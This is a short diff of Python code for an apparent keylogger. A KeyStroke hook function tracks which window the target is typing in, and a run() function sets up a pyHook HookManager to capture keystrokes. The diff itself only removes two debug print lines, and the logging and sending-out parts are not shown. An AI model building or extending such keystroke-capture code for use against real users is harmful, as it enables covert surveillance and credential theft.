@@ -46,7 +46,6 @@ def KeyStroke(event):
     global current_window
     global num
     global s
-    print "hook"
     # check to see if target changed windows
     if event.WindowName != current_window:
         current_window = event.WindowName        
@@ -73,7 +72,6 @@ def KeyStroke(event):
     # pass execution to next hook registered 
     return True
 def run(**args):
-    print "in run"
     global s
     global num
     kl         = pyHook.HookManager()
